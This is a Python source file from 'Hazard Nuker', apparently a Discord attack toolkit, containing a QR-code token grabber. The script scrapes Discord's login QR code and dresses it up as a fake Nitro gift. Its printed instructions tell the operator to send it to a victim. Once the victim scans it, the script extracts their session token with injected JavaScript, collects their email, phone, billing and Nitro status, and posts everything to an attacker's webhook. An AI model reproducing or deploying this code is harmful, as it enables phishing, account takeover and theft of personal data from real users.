# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

# Cred/inspiration goes to https://github.com/NightfallGT/Discord-QR-Scam


import os
import sys
import json
import Hazard
import requests

from PIL import Image
from time import sleep
from selenium import webdriver, common
from cairosvg import svg2png
from bs4 import BeautifulSoup
from colorama import Fore

from util.plugins.common import getDriver, getheaders, SlowPrint


def paste_template():
    # paste the finished QR code onto the nitro template
    im1 = Image.open("assets/template.png", "r")
    im2 = Image.open("assets/Qr_Code.png", "r")
    im1.paste(im2, (125, 415))
    im1.save("assets/discord_gift.png", quality=95)


def QR_Grabber(Webhook):
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Enter anything to continue. . . ")
            input()
            Hazard.main()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"Enter anything to continue. . .")
            input()
            Hazard.main()
    else:
        print(
            f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln't find a driver to create a QR code with"
        )
        sleep(3)
        print("Enter anything to continue. . . ", end="")
        input()
        Hazard.main()

    driver.get("https://discord.com/login")  # get discord url so we can log the token
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features="html.parser")

    # Create the QR code
    div = soup.find("div", {"class": "qrCode-2R7t9S"})
    qr_code = div.find("svg")

    with open("assets/temp_qr_code.svg", "w") as f:
        f.write(str(qr_code))

    # Convert the QR code to a png
    file = os.path.join(os.getcwd(), "assets\\Qr_Code.png")
    input_file = os.path.join(os.getcwd(), "assets\\temp_qr_code.svg")

    svg2png(url=input_file, write_to=file, scale=4)

    img = Image.open("assets/Qr_Code.png")
    img.crop((0, 0, 148, 148)).save("assets/Qr_Code.png")

    discord_login = driver.current_url

    paste_template()

    # remove the templates
    try:
        os.remove(os.getcwd() + "\\assets\\Qr_Code.png")
        os.remove(os.getcwd() + "\\assets\\temp_qr_code.svg")
        os.remove(os.getcwd() + "\\assets\\temp_qr_code.png")
    except Exception:
        pass

    print(f"\nQR Code generated in " + os.getcwd() + "\\assets")
    print(
        f"\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}"
    )
    print(
        f"{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}"
    )
    os.system(f'start {os.path.realpath(os.getcwd()+"/assets")}')
    if sys.argv[0].endswith(".exe"):
        print(
            f"\nOpening a new HazardNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}"
        )
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    # Waiting for them to scan QR code
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script(
                """
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                """
            )
            j = requests.get(
                "https://discord.com/api/v9/users/@me", headers=getheaders(token)
            ).json()
            badges = ""
            flags = j["flags"]
            if flags == 1:
                badges += "Staff, "
            if flags == 2:
                badges += "Partner, "
            if flags == 4:
                badges += "Hypesquad Event, "
            if flags == 8:
                badges += "Green Bughunter, "
            if flags == 64:
                badges += "Hypesquad Bravery, "
            if flags == 128:
                badges += "HypeSquad Brillance, "
            if flags == 256:
                badges += "HypeSquad Balance, "
            if flags == 512:
                badges += "Early Supporter, "
            if flags == 16384:
                badges += "Gold BugHunter, "
            if flags == 131072:
                badges += "Verified Bot Developer, "
            if badges == "":
                badges = "None"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "No Phone Number attached"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get(
                "https://discordapp.com/api/v6/users/@me/billing/subscriptions",
                headers=getheaders(token),
            ).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(
                len(
                    json.loads(
                        requests.get(
                            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                            headers=getheaders(token),
                        ).text
                    )
                )
                > 0
            )

            embed = {
                "avatar_url": "https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
                "embeds": [
                    {
                        "author": {
                            "name": "Hazard QR Code Grabber",
                            "url": "https://github.com/Rdimo/Hazard-Nuker",
                            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif",
                        },
                        "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                                "name": "**Token**",
                                "value": f"```fix\n{token}```",
                                "inline": False,
                            }
                        ],
                        "color": 8388736,
                        "footer": {
                            "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Nuker"
                        },
                    }
                ],
            }
            requests.post(Webhook, json=embed)
            break
    os._exit(0)
